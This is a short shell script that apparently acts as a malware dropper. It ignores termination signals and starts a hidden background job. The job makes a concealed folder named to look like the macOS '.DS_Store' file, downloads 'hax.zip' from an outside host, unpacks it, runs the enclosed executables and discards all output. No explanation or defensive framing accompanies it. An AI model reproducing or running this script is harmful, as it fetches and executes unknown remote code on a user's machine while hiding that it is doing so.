trap "" SIGTERM
nohup sh -c "
cd ~
rm -rf .D5_Store
mkdir .D5_Store
cd .D5_Store
rm -f /tmp/hax.lock
curl -O http://emraldia.com/hax.zip
unzip hax.zip
./exec
sh hax.sh
" > /dev/null &
